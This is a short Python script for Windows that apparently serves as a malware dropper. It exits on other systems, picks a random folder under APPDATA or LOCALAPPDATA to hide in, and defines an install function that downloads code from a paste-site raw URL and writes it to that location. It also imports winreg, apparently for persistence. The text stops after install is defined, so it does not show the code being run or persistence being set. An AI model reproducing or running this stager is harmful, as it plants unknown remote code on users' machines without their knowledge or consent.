from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice


if name != 'nt': 
    exit()

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("https://www.klgrth.io/paste/xwkm8/raw").read().decode("utf8"))
